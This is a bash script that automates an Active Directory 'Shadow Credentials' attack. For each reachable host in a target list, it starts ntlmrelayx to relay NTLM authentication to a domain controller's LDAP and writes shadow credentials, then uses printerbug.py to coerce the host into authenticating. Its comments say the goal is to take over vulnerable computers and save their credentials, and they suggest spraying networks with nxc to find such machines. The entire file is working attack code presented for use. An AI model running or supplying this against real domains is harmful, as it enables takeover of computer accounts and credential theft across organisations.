#!/bin/bash
# this script will relay to LDAP, take over the computers vulnerable to printerbug and webdav client, and save the credentials for them
# Uses ./targets.txt for a list of targets
# Best to spray the vulnerable to webdav client and printerbug
# nxc smb <CIDR> -u user -p pass -M printerbug,webdav
# You'll need NETBIOS name, use ADIDNS to add it `krbrelayx/dnstool.py`

# Shadow Target Specification - MACHINE.DOMAIN

usage() {
  echo "Usage: $0 -d <domain> -u <username> -p <password> -dc-target <ldap://dc.example.com> -shadow-targets-file <targets_file> -listen <netbios_name>"
  echo
  echo "Options:"
  echo "  -d  Domain name (e.g., example.local)"
  echo "  -u  Username for authentication"
  echo "  -p  Password for the specified username"
  echo "  -dc-target  LDAP URL of the domain controller (e.g., ldap://dc.example.com)"
  echo "  -shadow-targets-file  File containing FQDNs or IPs of target machines"
  echo "  -listen  NetBIOS name to listen for (e.g., KALI)"
  exit 1
}

# Default coercion method
COERCE_METHOD="printerbug"
LISTEN_NETBIOS=""

# Parse command-line arguments
while [[ "$#" -gt 0 ]]; do
  case $1 in
    -d) DOMAIN="$2"; shift ;;
    -u) USERNAME="$2"; shift ;;
    -p) PASSWORD="$2"; shift ;;
    -dc-target) DC_TARGET="$2"; shift ;;
    -shadow-targets-file) TARGETS_FILE="$2"; shift ;;
    -listen) LISTEN_NETBIOS="$2"; shift ;;
    *) echo "Unknown option: $1"; usage ;;
  esac
  shift
done

if [[ -z "$DOMAIN" || -z "$USERNAME" || -z "$PASSWORD" || -z "$DC_TARGET" || -z "$TARGETS_FILE" || -z "$LISTEN_NETBIOS" ]]; then
  echo "Error: Missing required arguments."
  usage
fi

REACHABLE_HOSTS="reachable_hosts.txt"
: > $REACHABLE_HOSTS

echo "[+] Checking host reachability..."

while read -r target; do
  echo "Pinging $target..."
  if ping -c 1 -W 1 "$target" &>/dev/null; then
    echo "$target is reachable."
    echo "$target" >> $REACHABLE_HOSTS
  else
    echo "$target is not reachable. Skipping..."
  fi
done < "$TARGETS_FILE"

if [ ! -s $REACHABLE_HOSTS ]; then
  echo "[-] No reachable targets found. Exiting."
  exit 1
fi

echo "[+] Starting Shadow Credentials attack on reachable targets using $COERCE_METHOD..."

while read -r target; do
  SHADOW_TARGET=$(echo "$target" | cut -d '.' -f 1)$

  echo "[+] Starting relay for target: $target with shadow target: $SHADOW_TARGET... and DC $DC_TARGET"
  python3 ntlmrelayx.py  "$DC_TARGET" -tf <(echo "$target") --shadow-credentials --shadow-target $SHADOW_TARGET --no-da --no-acl --no-validate-privs &
  RELAY_PID=$!

  sleep 5

echo "[+] Using PrinterBug to coerce authentication with listener: $LISTEN_NETBIOS..."
python3 printerbug.py $DOMAIN/$USERNAME:$PASSWORD@$SHADOW_TARGET "$LISTEN_NETBIOS@80/print"


sleep 10

kill $RELAY_PID
echo "[+] Completed Shadow Credentials attack for target: $target"

done < "$REACHABLE_HOSTS"

echo "[+] All targets processed."

# TODO PKINIT